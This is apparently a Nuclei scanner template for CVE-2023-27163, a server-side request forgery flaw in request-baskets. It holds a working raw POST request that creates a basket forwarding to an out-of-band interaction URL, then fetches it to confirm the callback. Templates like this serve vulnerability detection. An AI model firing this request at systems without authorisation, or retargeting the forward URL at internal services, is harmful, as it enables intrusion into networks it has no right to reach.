http:
- extractors:
  - dsl:
    - ' basket '
    name: path
    type: dsl
  - json:
    - .token
    name: token
    type: json
  matchers:
  - status:
    - 201
    type: status
  - part: header
    type: word
    words:
    - Created
  - part: body
    type: word
    words:
    - token
  matchers-condition: and
  raw:
  - 'POST /api/baskets/{{basket}} HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    X-Requested-With: XMLHttpRequest

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/112.0.5615.50 Safari/537.36

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/web/lep1qbi

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close


    {"forward_url":"{{ssrf_url}}","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":200}

    '
- extractors:
  - dsl:
    - ' body '
    name: Content
    type: dsl
  matchers:
  - status:
    - 200
    type: status
  - part: interactsh_protocol
    type: word
    words:
    - http
  matchers-condition: and
  path:
  - '{{BaseURL}}/{{basket}}'
  - '{{BaseURL}}{{basket}}'
id: CVE-2023-27163
info:
  author: Esonhugh-self-maintained
  description: "This is a SSRF vulnerability in the request baskets (web application).\
    \ \nhttps://github.com/darklynx/request-baskets\n"
  name: CVE-2023-27163 request-baskets ssrf
  reference:
  - https://notes.sjtu.edu.cn/s/MUUhEymt7
  - https://github.com/advisories/GHSA-58g2-vgpg-335q
  severity: high
  tags: ssrf,proxy,oast,cve,cve2023
variables:
  basket: '{{ rand_base(5) }}'
  ssrf_url: '{{ interactsh_url }}'
